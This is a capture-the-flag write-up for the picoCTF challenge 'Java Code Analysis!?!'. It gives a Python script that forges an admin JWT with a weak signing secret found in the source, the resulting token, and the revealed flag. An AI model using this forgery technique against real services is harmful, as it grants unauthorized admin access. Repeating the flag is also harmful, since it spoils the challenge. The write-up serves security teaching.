# Java Code Analysis!?!

# Description
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Additional details will be available after launching your challenge instance.
# Solution

-  I change the jwt token payload to admin and userid to 2 this information is embed in the source code of the project and using the next script I generate a new jwt token with the payload before mentioned the secret key for the signature is embed in the code as well

``` python
import jwt, datetime

token = jwt.encode(
  {
    'iss': 'bookshelf',
    'iat': datetime.datetime.utcnow(),
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=7),
    'userId': 2,
    'email': 'user',
    'role': 'Admin'
  },
  '1234',
  algorithm='HS256'
)

print(token)

```

- Execution of the script 

```bash
python3 sc.py 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJib29rc2hlbGYiLCJpYXQiOjE3NDQ3NzI1MTIsImV4cCI6MTc0NTM3NzMxMiwidXNlcklkIjoyLCJlbWFpbCI6InVzZXIiLCJyb2xlIjoiQWRtaW4ifQ.WMUyfQXYSmBdLEhnIVivNN1z2apd9MKX4BmRe6vQSdI
```

-  Once I got all the part of the jwt token I just paste the data in the field of local storage and using the search bar I type flag and that's it I get the flag.

```bash
# Output
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}
```

# References
- [CTF Challenge Writeup: PicoCTF — Java Code Analysis!?! by Andrej Topalov](https://andrejtopalov.medium.com/ctf-challenge-writeup-picoctf-java-code-analysis-e1774db455dc)
